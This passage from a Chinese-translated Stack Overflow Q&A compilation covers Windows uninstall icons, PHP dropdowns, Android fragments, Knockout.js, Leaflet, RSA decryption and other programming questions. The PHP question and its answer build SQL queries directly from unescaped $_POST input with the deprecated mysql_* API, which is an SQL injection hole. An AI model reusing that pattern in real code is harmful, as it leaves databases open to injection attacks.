[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinRAR archiver]
"DisplayName"="WinRAR 4.20 (64-bit)"
"DisplayVersion"="4.20.0"
"VersionMajor"=dword:00000004
"VersionMinor"=dword:00000014
"UninstallString"="C:\\Program Files\\WinRAR\\uninstall.exe"
"DisplayIcon"="C:\\Program Files\\WinRAR\\WinRAR.exe"
"InstallLocation"="C:\\Program Files\\WinRAR\\"
"NoModify"=dword:00000001
"NoRepair"=dword:00000001
"Language"=dword:00000000
"Publisher"="win.rar GmbH" 
```

您可以更改（或创建它，如果它不存在）`DisplayIcon`键的值。这将更改控制面板中*添加或删除程序中的卸载程序图标。*

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2015-07-10T10:47:49.757

Windows 安装程序支持您可以添加 Icon 的属性`ARPPRODUCTICON`。要设置此属性，我们需要使用`Icon`元素在安装程序中添加图标。

```
<Icon Id="icon.ico" SourceFile="MySourceFiles\icon.ico"/>
<Property Id="ARPPRODUCTICON" Value="icon.ico" /> 
```

这将在控制面板中添加图标。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2017-04-20T14:30:01.007

最简单的方法 - 首次启动时运行此代码（vb .net）：

```
 Dim myUninstallKey As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Uninstall")
 dim iconSourcePath As String = "c:\myprogram\myprogram.exe,0"
 Dim mySubKeyNames As String() = myUninstallKey.GetSubKeyNames()
 For i As Integer = 0 To mySubKeyNames.Length - 1
     Dim myKey As RegistryKey = myUninstallKey.OpenSubKey(mySubKeyNames(i), True)
     Dim myValue As Object = myKey.GetValue("DisplayName")
     If myValue IsNot Nothing AndAlso myValue.ToString() = "YourProgaram" Then
         myKey.SetValue("DisplayIcon", iconSourcePath)
         Exit For
     End If
 Next 
```

或 C#

```
RegistryKey myUninstallKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Uninstall");
string iconSourcePath = "c:\myprogram\myprogram.exe,0";
string[] mySubKeyNames = myUninstallKey.GetSubKeyNames();
for (int i = 0; i <= mySubKeyNames.Length - 1; i++) {
    RegistryKey myKey = myUninstallKey.OpenSubKey(mySubKeyNames(i), true);
    object myValue = myKey.GetValue("DisplayName");
    if (myValue != null && myValue.ToString() == "YourProgaram") {
        myKey.SetValue("DisplayIcon", iconSourcePath);
        break; // TODO: might not be correct. Was : Exit For
    }
} 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-09-06T04:17:45.263

是的，您可以通过以下代码执行此操作：

```
 string Install_Reg_Loc = @"Software\Microsoft\Windows\CurrentVersion\Uninstall";
 string displayIcon = @"C:\MorganTech\setup-icon.ico";
 RegistryKey hKey = (Registry.LocalMachine).OpenSubKey(Install_Reg_Loc, true);
 RegistryKey appKey = hKey.OpenSubKey(productName);
 appKey.SetValue("DisplayIcon", (object)displayicon, RegistryValueKind.String) 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2018-07-30T21:10:33.810

在 Visual Studio 2017 社区版中：

选择安装程序项目并按 F4 （这次鼠标单击没有帮助，但我发誓我之前通过另一种方式得到了它。）

# php - 使用外键将数据从一个表插入另一个表

> ID：16204890
> 
> 赞同：0
> 
> 时间：2013-04-25T01:20:22.380
> 
> 标签：php, forms, foreign-keys

好的，所以我想在我的数据库中的区域表中插入/更新一个新区域，一个区域应该链接到一个建筑物（buildingID 是区域表中的一个 fk），目前我已经制作了一个表格，以便我可以输入与建筑物链接的新区域，但是我必须手动输入 buildingID，我想要将建筑物表中的所有 Buildingnames 显示在下拉框中，以便我可以选择它，而不是让添加新区域时输入 buildingID。

希望这是有道理的，非常感谢任何可以帮助我的人！

```
?php
$con = mysql_connect ("localhost","user","pass");
if (!$con){
die("can not connect: " . mysql_error());
}
mysql_select_db("dbname",$con);

if(isset($_POST['update'])){
$updatequery = "UPDATE zones SET Zonename='$_POST[zonename]', Zonenumber='$_POST[zonenumber]', Zonecapacity='$_POST[zonecapacity]', buildingID='$_POST[buildingid]'WHERE zoneID='$_POST[hidden]'";
mysql_query($updatequery, $con);
};

if(isset($_POST['add'])){
$addquery = "INSERT INTO zones (Zonename, Zonenumber, Zonecapacity, buildingID) VALUES       ('$_POST[uname]', '$_POST[ucapacity]', '$_POST[unumber]', '$_POST[ubuilding]')";
mysql_query($addquery, $con);
};

$sql = "SELECT * FROM zones";

$myData = mysql_query($sql,$con);
echo "<table>
<tr>
<th> </th>
<th>Zone Name</th>
<th>Zone Number</th>
<th>Zone Capacity</th>
<th>Building ID</th>
</tr>";
while ($record = mysql_fetch_array($myData)){
echo "<form action=addeditzone.php method=post>";
echo " <tr>";
echo "<td>" . $record['zoneID'] . " </td>";
echo "<td>" . "<input type=text name=zonename value='" . $record['Zonename'] . "' </td>";
echo "<td>" . "<input type=text name=zonenumber value='" . $record['Zonenumber'] . "' </td>";
echo "<td>" . "<input type=text name=zonecapacity value='" . $record['Zonecapacity'] . "'  </td>";
echo "<td>" . "<input type=text name=buildingid value='" . $record['buildingID'] . "'    </td>";
echo "<td>" . "<input type=hidden name=hidden value=" . $record['zoneID'] . " </td>";
echo "<td>" . "<input type=submit name=update value=update" . " </td>";
echo "</form>";
}
echo "<form action=addeditzone.php method=post>";
echo "<tr>";
echo "<td><td><input type=text name=uname></td>";
echo "<td><input type=text name=unumber></td>";
echo "<td><input type=text name=ucapacity></td>";
echo "<td><input type=text name=ubuilding></td>";
echo "<td>" . "<input type=submit name=add value=add>" . " </td>";
echo "<tr>";
echo "</form>";
echo "</table>";
mysql_close($con);

?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T01:47:41.073

这是用数据库表数据填充保管箱的代码。

```
<?php
    $con = mysql_connect ("127.0.0.1","root");
    if (!$con){
        die("can not connect: " . mysql_error());
    }
    mysql_select_db("examples",$con);
if (isset($_POST['submit'])){

    $sql = "INSERT INTO zones (Zonename,Zonecapacity,buildingID) VALUES
    ('$_POST[Zonename]','$_POST[Zonecapacity]','$_POST[BuildingID]')";
    $inserted=mysql_query($sql,$con);
    if($inserted) {
        echo "New Zone succesfully entered";
    } else {
        echo "fail ". mysqli_error($con);
    };
} else {
    echo "<form action='insertzone1.php' method='post'>
            Insert New Zone:<br><br>
            Zone Name:<br><input type='text' name='Zonename'><br><br>
            Zone Capacity:<br><input type='int' name='Zonecapacity'><br><br>
            Building:<br>";
    $sql = "select * from building";
    $res = mysql_query($sql,$con);
    echo mysql_error($con);
    echo "<select name='BuildingID'>";
    while ($row = mysql_fetch_array($res)){

        echo "<option value=" . $row['buildingID'] . ">". $row['buildname'] . "</option>";
    }
    echo "</select><br><input type='submit' name='submit'>
            </form>";

    mysql_close($con);
}; 
```

# android - 为什么片段视图会导致 Eclipse 模拟器中的 android 应用程序失败？

> ID：16204891
> 
> 赞同：0
> 
> 时间：2013-04-25T01:20:28.287
> 
> 标签：android, eclipse, android-fragments

我正在关注[这个](https://developers.google.com/maps/documentation/android/start#the_google_maps_api_key)Google 演示，当我包含片段视图时，我的应用程序失败了。eclipse 模拟器会生成一个对话框，说明应用程序意外关闭。

该代码根本没有任何意义，也不是问题，因为当我在没有 activity_main.xml 中的片段的情况下运行它时，它工作正常。

代码：

导入android.app.Activity；导入android.os.Bundle；

公共类 MainActivity 扩展 Activity {

```
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
} 
```

}

我无法复制 xml，但它是默认的空白“activity_main”xml 文件（带有 RelativeLayout 根），其中在 RelativeLayout 父级内部添加了片段，与演示中完全相同，只是没有重新复制的 xml 版本标记（这与已经存在的相同）。

当我删除片段时，它运行良好。

我在做什么使片段类​​无法使用？

**更新：这里是 logcat**

```
04-25 01:35:42.202: D/AndroidRuntime(441): Shutting down VM

04-25 01:35:42.202: W/dalvikvm(441): threadid=1: thread exiting with uncaught exception (group=0x40015560)

04-25 01:35:42.221: E/AndroidRuntime(441): FATAL EXCEPTION: main

04-25 01:35:42.221: E/AndroidRuntime(441): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.example.sikkemamap/com.example.sikkemamap.MainActivity}: android.view.InflateException: Binary XML file line #7: Error inflating class fragment

04-25 01:35:42.221: E/AndroidRuntime(441):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1647)

04-25 01:35:42.221: E/AndroidRuntime(441):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1663)

04-25 01:35:42.221: E/AndroidRuntime(441):  at android.app.ActivityThread.access$1500(ActivityThread.java:117)

04-25 01:35:42.221: E/AndroidRuntime(441):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:931)

04-25 01:35:42.221: E/AndroidRuntime(441):  at android.os.Handler.dispatchMessage(Handler.java:99)

04-25 01:35:42.221: E/AndroidRuntime(441):  at android.os.Looper.loop(Looper.java:123)

04-25 01:35:42.221: E/AndroidRuntime(441):  at android.app.ActivityThread.main(ActivityThread.java:3683)

04-25 01:35:42.221: E/AndroidRuntime(441):  at java.lang.reflect.Method.invokeNative(Native Method)

04-25 01:35:42.221: E/AndroidRuntime(441):  at java.lang.reflect.Method.invoke(Method.java:507)

04-25 01:35:42.221: E/AndroidRuntime(441):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)

04-25 01:35:42.221: E/AndroidRuntime(441):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)

04-25 01:35:42.221: E/AndroidRuntime(441):  at dalvik.system.NativeStart.main(Native Method)

04-25 01:35:42.221: E/AndroidRuntime(441): Caused by: android.view.InflateException: Binary XML file line #7: Error inflating class fragment

04-25 01:35:42.221: E/AndroidRuntime(441):  at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:581)

04-25 01:35:42.221: E/AndroidRuntime(441):  at android.view.LayoutInflater.rInflate(LayoutInflater.java:623)

04-25 01:35:42.221: E/AndroidRuntime(441):  at android.view.LayoutInflater.inflate(LayoutInflater.java:408)

04-25 01:35:42.221: E/AndroidRuntime(441):  at android.view.LayoutInflater.inflate(LayoutInflater.java:320)

04-25 01:35:42.221: E/AndroidRuntime(441):  at android.view.LayoutInflater.inflate(LayoutInflater.java:276)

04-25 01:35:42.221: E/AndroidRuntime(441):  at com.android.internal.policy.impl.PhoneWindow.setContentView(PhoneWindow.java:207)

04-25 01:35:42.221: E/AndroidRuntime(441):  at android.app.Activity.setContentView(Activity.java:1657)

04-25 01:35:42.221: E/AndroidRuntime(441):  at com.example.sikkemamap.MainActivity.onCreate(MainActivity.java:11)

04-25 01:35:42.221: E/AndroidRuntime(441):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1047)

04-25 01:35:42.221: E/AndroidRuntime(441):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1611)

04-25 01:35:42.221: E/AndroidRuntime(441):  ... 11 more

04-25 01:35:42.221: E/AndroidRuntime(441): Caused by: java.lang.ClassNotFoundException: android.view.fragment in loader dalvik.system.PathClassLoader[/data/app/com.example.sikkemamap-2.apk]

04-25 01:35:42.221: E/AndroidRuntime(441):  at dalvik.system.PathClassLoader.findClass(PathClassLoader.java:240)

04-25 01:35:42.221: E/AndroidRuntime(441):  at java.lang.ClassLoader.loadClass(ClassLoader.java:551)

04-25 01:35:42.221: E/AndroidRuntime(441):  at java.lang.ClassLoader.loadClass(ClassLoader.java:511)

04-25 01:35:42.221: E/AndroidRuntime(441):  at android.view.LayoutInflater.createView(LayoutInflater.java:471)

04-25 01:35:42.221: E/AndroidRuntime(441):  at android.view.LayoutInflater.onCreateView(LayoutInflater.java:549)

04-25 01:35:42.221: E/AndroidRuntime(441):  at com.android.internal.policy.impl.PhoneLayoutInflater.onCreateView(PhoneLayoutInflater.java:66)

04-25 01:35:42.221: E/AndroidRuntime(441):  at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:568)

04-25 01:35:42.221: E/AndroidRuntime(441):  ... 20 more

04-25 01:35:55.342: I/Process(441): Sending signal. PID: 441 SIG: 9 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T05:32:56.223

You're extending `Activity` while targeting a pre-Honycomb (API level 11) device. For use of fragments on Gingerbread (API level 10) and lower you should be extending `FragmentActvity` instead.

Note: FragmentActivity is part of the Android Support Package, so make sure you have it imported in your project.

# data-binding - 自动附加到每个绑定元素的自定义绑定？

> ID：16204896
> 
> 赞同：0
> 
> 时间：2013-04-25T01:20:50.300
> 
> 标签：data-binding, knockout.js

无论如何要添加“全局”自定义绑定吗？例如，我希望为每个绑定的元素触发一个绑定，而不必将绑定添加到`data-bind`属性。将其视为在数据绑定过程中某个时间触发的初始化程序。

我真正想做的是：当一个新模型被添加到一个新模型时`observableArray`，我想首先自动关注新模型`input`，以便用户可以立即开始输入。我认为这不适用于任何现有的绑定。

```
ko.bindingHandlers.attach = {
    init: function (element, valueAccessor, allBindingsAccessor, viewModel, bindingContext) {
        valueAccessor().boundElements.push(element);
    }
}; 
```

那行得通，但我宁愿不必`data-bind="attach: $data"`对每个绑定元素都做。有没有办法告诉 KO`attach`在元素上有另一个绑定时始终使用该绑定。

**注意：**写完这篇文章后，我想我还是决定使用手动方法，但我仍然想知道这是否可能。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T23:41:46.317

这个答案特别是关于如何在`input`添加新模型时首先关注视图，因为我提出的这样做的技术与你的完全不同。

我在最近的一个项目中也有同样的要求，基本上通过在我的视图模型中包含一个名为`firstHasFocus`. 每当该视图模型变为活动状态时，例如切换“选项卡”时，我都会设置`firstHasFocus`为`true`. 在视图中，第一个`input`绑定到使用`hasfocus`.

这是我的代码中的一个示例，它响应向导类型界面中的“下一步”按钮。它切换到下一步，如果这是当前可用的最后一步，它会关注第一个输入。

```
this.goNext = function() {
    if (this.isNextAvailable()) {
        var newIndex = this.currentStepIndex() + 1;
        this.setCurrentStep(this.steps()[newIndex], newIndex);
        if (!this.isNextAvailable()) {
            this.currentStep().firstHasFocus(true);
        }
    }
}; 
```

为了确保`firstHasFocus(true)`始终更新绑定，它被定义为始终通知：

```
this.firstHasFocus = ko.observable(false).extend({notify: 'always'}); 
```

每个步骤都有一个对应的视图，该视图可以包含对`firstHasFocus`.

```
<h1>Select the Station Info Columns</h1>
<form>
    <label for="stationColumn">Station Name</label>
    <select id="stationColumn" name="stationColumn" data-bind="
                    options: data.headerVarNames, optionsCaption: '----',
                    value: data.stationHeaderName, valueUpdate: 'afterkeydown',
                    setfocus: firstHasFocus"></select>
    <label for="siteColumn">Site Name</label>
    <select id="siteColumn" name="siteColumn" data-bind="
                    options: data.headerVarNames, optionsCaption: '----',
                    value: data.siteNameHeaderName"></select>
... 
```

我使用自定义绑定，`setfocus`而不是标准`hasfocus`，因为不想`blur`被调用。这是我的`setfocus`绑定：

```
ko.bindingHandlers.setfocus = {
    init: function(element, valueAccessor) {
        var modelValue = valueAccessor();
        if (!ko.isWriteableObservable(modelValue)) {
            throw new Error('setfocus must be used with a writable observable');
        }
        var writeValue = function(event) {
            var modelValue = valueAccessor(),
                valueToWrite = element.ownerDocument.activeElement === element;
            if (event.type == 'focusin' && !valueToWrite)
                element.focus();
            else if (valueToWrite != modelValue())
                modelValue(valueToWrite);
        };
        ko.utils.registerEventHandler(element, "focus", writeValue);
        ko.utils.registerEventHandler(element, "focusin", writeValue); // For IE
        ko.utils.registerEventHandler(element, "blur",  writeValue);
    },
    update: function(element, valueAccessor) {
        var value = valueAccessor()();   // access and unwrap observable
        setTimeout(function() {
            if (value && element.offsetWidth && element.offsetHeight && document.activeElement && document.activeElement != element) {
                element.focus();
                ko.utils.triggerEvent(element, "focusin"); // For IE, which doesn't reliably fire "focus" or "blur" events synchronously
            }
        });
    }
}; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T02:10:30.447

通常，您的视图模型不需要访问 DOM 元素（这就是绑定的用途）。但是有一种方法可以做到这一点，它被称为自定义绑定提供程序。这没有正式记录，但描述是[Ryan Niemeyer 的博客](http://www.knockmeout.net/2011/09/ko-13-preview-part-2-custom-binding.html)上的一些细节。

因此，这是您可以修改绑定提供程序以添加此行为的一种方法：

```
var origNodeHasBindings = ko.bindingProvider.instance.nodeHasBindings,
    origGetBindings = ko.bindingProvider.instance.getBindings;

ko.bindingProvider.instance.nodeHasBindings = function(node) {
    return (node.nodeType === 1) || origNodeHasBindings(node);
};
ko.bindingProvider.instance.getBindings = function(node, bindingContext) {
    var bindings = origGetBindings.call(this, node, bindingContext) || {};
    bindings.attach = bindingContext.$data;
    return bindings;
}; 
```

# ruby-on-rails - 将差值相加并计算总数

> ID：16204898
> 
> 赞同：1
> 
> 时间：2013-04-25T01:21:02.300
> 
> 标签：ruby-on-rails, activerecord, sum

我有三个模型：用户，属于音乐会，属于地区。一个用户在一个地区听音乐会。模型belongs_to通过=>concerts分别与用户建立关系。

```
class Region < ActiveRecord::Base
  has_many :concerts
  has_many :users, :through => :concerts
end 
```

我在用户模型中有一个 start_time 和 end_time，以便我可以记录用户听音乐会的分钟数。在用户视图中，我可以通过以下方式呈现：

```
<%= user.start_time.to_i - user.end_time.to_i %> 
```

但是在如何计算音乐会级别所有用户收听的总分钟数时遇到了困难。

```
@total = @users.sum(:group=>:concert, :conditions => [???]) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T01:55:58.893

据我所知，这应该适用于 MySQL，其他数据库将有自己的功能来处理这类事情。我在搜索中看不到明显的可移植函数，但您可以尝试滚动自己的计算。

```
@total = @users.sum(:select=>'TIMESTAMPDIFF(MINUTE, user.start_time, user.end_time) AS duration', :group=>:concert) 
```

# matlab - Matlab - 每个图的颜色不同

> ID：16204902
> 
> 赞同：-2
> 
> 时间：2013-04-25T01:21:28.643
> 
> 标签：matlab

假设我创建`figure(1)`并在其上绘制多个图形`plot`，就像这样 -

```
figure(1)
plot(...) 
.
.
.
plot(...) // all the plot's with different color 
```

是否有任何选项设置可以用不同的颜色`figure(1)`绘制每个选项？`plot`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T01:26:31.493

尝试类似的东西

```
plot(f,R,'m--','LineWidth',2); 
```

有很多选项，如果你执行，`help plot`你会得到整个可用的集合。

# java - RSA 解密打印 NULL

> ID：16204906
> 
> 赞同：0
> 
> 时间：2013-04-25T01:22:35.370
> 
> 标签：java, cryptography, rsa, bufferedreader, printwriter

我相信我这样做是对的。我如何看待使用 RSA 解密文件：

1.  读入文件的每一行作为`String`
2.  放`cipher.init(Cipher.DECRYPT_MODE, privateKey)`
3.  将字符串转换为`char[]`使用`Hex.decodeHex(String.toCharArray())`
4.  最后做`cipher.doFinal(x)`

这听起来对吗？我正在这样做，但它不起作用，`DecryptedFile.txt`只是 2 行“null”。

我可以使用几乎完全相同的过程进行加密，但`cipher.init(Cipher.ENCRYPT_MODE, publicKey)`很明显。

这是我的代码

```
try {
        BufferedReader inStream = new BufferedReader (new FileReader(cryptoFile));

        int k = 0;

        fileContents.add(inStream.readLine());

        while(fileContents.get(k) != null) {
            k++;
            fileContents.add(inStream.readLine());
        }

        inStream.close();

        try {

            PrivateKey privateKey = kp.getPrivate();
            Cipher cipher = Cipher.getInstance("RSA");
            cipher.init(Cipher.DECRYPT_MODE, privateKey);

            int j = 0;

            while(fileContents.get(j) != null) {

                String text = fileContents.get(j);

                try {                        
                    x = Hex.decodeHex(text.toCharArray());
                    y = cipher.doFinal(x);
                } catch (DecoderException ex) {
                    Logger.getLogger(Crypto.class.getName()).log(Level.SEVERE, null, ex);
                }

                try (PrintWriter file = new PrintWriter(
                        new BufferedWriter(
                        new FileWriter("DecryptedFile.txt", true)))) {
                    file.println(y);
                } catch (IOException e) {
                    System.err.println("IOERROR: " + e.getMessage() + "\n");
                }

                j++;
            }

        } catch (NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException | IllegalBlockSizeException | BadPaddingException ex) {
            Logger.getLogger(Crypto.class.getName()).log(Level.SEVERE, null, ex);
        }

    } catch (FileNotFoundException e) {
        System.err.println("IOERROR: File NOT Found: " + cryptoFile + "\n");
    } catch ( IOException e ) {
        System.err.println("IOERROR: " + e.getMessage() + "\n");
    } finally {
        messagePane.setText(messagePane.getText() + "\n\n"
                + cryptoFile + "is done being decrypted.");
        messagePane.setText(messagePane.getText() + "\n"
                + "Decrypted file saved to \'DecryptedFile.txt\'.");

        cryptoFile = "";
        pathTextField.setText(cryptoFile);
        encryptButton.setEnabled(false);
        decryptButton.setEnabled(false);

    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T01:44:59.543

您在从 FileContents 派生的 String 派生的字符数组上使用密码 - 这可能会搞砸它的编码。相反，从文件中读取一个字节数组并将其用作密码的输入。

如有必要，填充输入是个好主意 - 使用`Cipher.getInstance("RSA/ECB/PKCS1Padding")`

将字符串转换为字节时始终指定字符编码（例如`str.getBytes("UTF-8")`），反之亦然 - 不同的 JVM 使用不同的默认字符编码。

# javascript - 让传单画布层显示在顶部的解决方法？

> ID：16204907
> 
> 赞同：2
> 
> 时间：2013-04-25T01:22:41.683
> 
> 标签：javascript, leaflet

我正在尝试在[L.geoJson](http://leafletjs.com/reference.html#geojson)图层上显示传单画布图层。但是，传单中似乎存在一个错误，无法使用`bringToBack()`/`bringToFront()`方法完成此操作。

```
var canvasTiles = L.tileLayer.canvas(); 
```

[https://github.com/Leaflet/Leaflet/issues/974](https://github.com/Leaflet/Leaflet/issues/974)

我尝试在`drawTile()`方法结束时调用以下函数，试图将画布层置于顶部，但它不起作用。

```
var interiorMaskLayer = null;
var exteriorMaskLayer = null;

function addMaskToBack(){
    insertAtTheBottom = true;
    if (interiorMaskLayer && exteriorMaskLayer){        

        map.removeLayer(interiorMaskLayer);
        map.removeLayer(exteriorMaskLayer);
        }   
    interiorMaskLayer = L.geoJson(interiorMaskGeojsonPoly, {style: interiorStyle})
    map.addLayer(interiorMaskLayer, insertAtTheBottom);
    exteriorMaskLayer = L.geoJson(exteriorMaskGeojsonPoly, {style: exteriorStyle});
    map.addLayer(exteriorMaskLayer, insertAtTheBottom);
} 
```

有没有一种解决方法可以让画布层显示在顶部？

*使用 Leaflet-Leaflet-v0.5.1-0-gc1d410f.zip*

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T05:50:55.207

问题是它们位于不同的`DIV`元素中，具有不同的 z 索引，因此无论您为子节点提供什么 z 索引，它都不会出现在其兄弟节点的前面或后面。

这是我所做的，作为一个糟糕但可行的解决方案：

对传单源代码进行以下更改（遵循[传单-src.js](https://github.com/Leaflet/Leaflet/blob/v0.5.1/dist/leaflet-src.js)版本 5.1 文件），将覆盖窗格移动到平铺窗格：

[第 1782 行](https://github.com/Leaflet/Leaflet/blob/v0.5.1/dist/leaflet-src.js#L1782)：`panes.overlayPane = this._createPane('leaflet-overlay-pane', this.tilePane);`

仅从图块窗格中删除图块：

[第 8242 行](https://github.com/Leaflet/Leaflet/blob/v0.5.1/dist/leaflet-src.js#L8242)：

```
_clearTileBg: function () {
        if (!this._animatingZoom && !this.touchZoom._zooming) {
            /* this._tileBg.innerHTML = ''; */
            var the_tiles = this._tileBg.getElementsByClassName('leaflet-layer');
            var the_count = the_tiles.length;
            while(the_count>0){
                var child = the_tiles[the_count-1];
                child.parentNode.removeChild(child);
                the_count--;
            }
        }
    } 
```

并在移动图块时移动覆盖窗格（缩放）：

[并在第 8230](https://github.com/Leaflet/Leaflet/blob/v0.5.1/dist/leaflet-src.js#L8230)行之前添加此行：`this._tilePane.appendChild(this.getPanes().overlayPane);`

这些更改将画布添加到平铺窗格中，因此它们是同级的，因此它们的 z 索引将影响它们相对于彼此的位置。`this._tileBg.innerHTML = '';`因此，您需要移除切片图层，而不是清除切片窗格 ( )。此外，传单交替使用哪个窗格是平铺窗格，以便它可以执行缩放动画，因此您需要将覆盖窗格移动到平铺窗格。

此修复程序正在进行中。

希望这可以帮助！

# linux - 系统重启后 Linux 中的服务自动启动

> ID：16204909
> 
> 赞同：0
> 
> 时间：2013-04-25T01:22:50.593
> 
> 标签：linux, service, startup

大家好，需要一些帮助，了解如何在 CentOS (Linux) 中使服务在系统启动时自动启动。特别是我在谈论 tomcat 和 radius 我有脚本但不确定将它们放在哪里，也许你会建议？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T01:32:41.983

您需要编辑的文件是**/etc/rc.d/rc.local**（或 /etc/rc.local 对于基于 Debian 的系统）只需添加：

/path/to/yourScript.sh

保存文件并重新启动！此论坛回复中的更多详细信息： [LinuxQuestions.org](http://www.linuxquestions.org/questions/slackware-14/auto-execute-shell-script-on-startup-294891/)

# php - 颜色键控图像在 PHP 中不起作用

> ID：16204913
> 
> 赞同：0
> 
> 时间：2013-04-25T01:23:47.080
> 
> 标签：php, png, gd, alpha, alphablending

输入图像具有洋红色背景。

输出的图像始终具有黑色背景。

两种尝试都给出相同的结果。我希望它是 alpha 背景，而不是黑色背景。

尝试#1：

```
imagesavealpha($image, true);
imagealphablending($image, false);
$trans = imagecolorallocate($image, 255, 0, 255);
imagecolortransparent($image, $trans);
imagepng($image, $label . '.png'); 
```

尝试#2：

```
imagesavealpha($image, true);
imagealphablending($image, false);
$trans = imagecolorallocatealpha($image, 0, 0, 0, 0);
for ($x = 0; $x < imagesx($image); ++$x) {
    for ($y = 0; $y < imagesy($image); ++$y) {
        $rgb = imagecolorat($image, $x, $y);
        $r = ($rgb >> 16) & 0xFF;
        $g = ($rgb >> 8) & 0xFF;
        $b = $rgb & 0xFF;
        if ($r == 255 && $g == 0 && $b == 255) {
            imagesetpixel($image, $x, $y, $trans);
        }
    }
}
imagepng($image, $label . '.png'); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:33:21.623

似乎`imagecolorallocatealpha`的 alpha 参数是非标准的。使用 0 到 127，其中 127 是完全透明的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-28T08:19:38.000

您的尝试#1 对我来说看起来不错，只是不要触摸 alphablending。

为了避免透明度问题，我习惯于在创建图像后设置它：

```
$image = imagecreatetruecolor($width, $height);
$trans = imagecolorallocate($image, 0xFF, 0x0, 0xFF);
imagefill($image, 0, 0, $trans);
imagecolortransparent($image, $trans); 
```

在这里，我确定我的整个图像背景是透明的，我只需要把我的东西放进去。

# python - 为什么我的繁重 python 脚本在 Windows 上暂停？可以预防吗？

> ID：16204914
> 
> 赞同：0
> 
> 时间：2013-04-25T01:23:50.707
> 
> 标签：python, windows, concurrent-programming

我构建了一个名为 的python 脚本`convert.py`，它是一个文件转换器（SQLite3 -> SQLite3）。使用繁重的 CPU 和 I/O 大约需要 30 分钟才能完成。

我在我的计算机上打开了 30 个 CMD.EXE 窗口（Windows 7，具有 2 个内核和超线程的 CPU），并`convert.py`在每个窗口上启动。我让他们通宵工作，所以我预计到第二天早上才能全部完成……但事实并非如此。他们只完成了一半。CPU 监视器日志告诉我，我的计算机在 1 小时内 100% 运行，然后突然开始只使用 25%。似乎所有 CPU 功率都没有用于左侧任务。

当我按下 Ctrl+C 时，左边的任务恢复了它的工作。

那么发生了什么？这个问题是python的问题，还是windows的问题？有没有办法让我的计算机在我的 python 脚本上持续 100% 工作，直到所有这些都完成？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T07:13:48.483

The reason was that each process used massive memory, and I tried to work it concurrently. It was over capacity. It was frequently *swapping out*, but it was hidden by SQLite access which was also working hard with my HDD.

I would like to thank Lennart, who notified me to check other params in my computer, and everybody who gave me guesses and hints, since I gave too less information about the issues occuring in front of me.

# android-ndk - 以稳定的速度显示帧。（OpenGL ES 2.0 for android ndk）

> ID：16204915
> 
> 赞同：1
> 
> 时间：2013-04-25T01:23:58.630
> 
> 标签：android-ndk, opengl-es-2.0, frame-rate

我尝试将 openGL 与 ndk 一起使用。某些设备似乎显示帧非常缓慢。我想稳定地显示帧。

如果设备速度太快，我可以像这段代码一样设置一个限制。

[使用 Android 的 GLSurfaceView.RENDERMODE_CONTINUOUSLY 时如何限制帧率？](https://stackoverflow.com/questions/4772693/how-to-limit-framerate-when-using-androids-glsurfaceview-rendermode-continuousl)

相反，如果太慢，我该怎么办？我的意思是，如何在 Android 的 GLSurfaceView 上控制 fps？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T08:54:00.900

您应该使您的逻辑与帧速率无关。例如，您的所有动画都应基于 frame_delta_time 计算。这个 delta_time 是使用渲染最后一帧（或最后一帧）所花费的平均时间计算的。

检查这个：[https ://gamedev.stackexchange.com/questions/13008/how-to-get-and-use-delta-time](https://gamedev.stackexchange.com/questions/13008/how-to-get-and-use-delta-time)

有一些解决方案可以限制你的帧速率，但我的建议是首先让你的逻辑帧速率不可知，然后考虑限制帧速率：[How to limit framerate when using Android's GLSurfaceView.RENDERMODE_CONTINUOUSLY?](https://stackoverflow.com/questions/4772693/how-to-limit-framerate-when-using-androids-glsurfaceview-rendermode-continuousl)

# methods - 我需要为 toString 和 equals 创建一个抽象方法吗？

> ID：16204918
> 
> 赞同：0
> 
> 时间：2013-04-25T01:24:36.460
> 
> 标签：methods, equals, abstract, tostring

所以我的程序正在创建四边形，我被告知要为 findArea() 和 findPerimeter() 创建抽象方法，但我需要它们用于 toString() 和 boolean equals 方法吗？

```
abstract public class Quad {
private int s; //Base top
public Quad(){
    s = 1;
}
Quad(int s){
    this.s = s;
}
abstract public int findPerimeter();
abstract public int findArea();
abstract public String toString();
abstract public boolean equals(Object o);
public int getS() {
    return s;
}
public void setS(int s){
    this.s = s;
} 
```

}

```
class Square extends Quad{
private static int numSquares = 0;
private int s, iD;
public Square(){
    super();
    s = super.getS();
    numSquares ++;
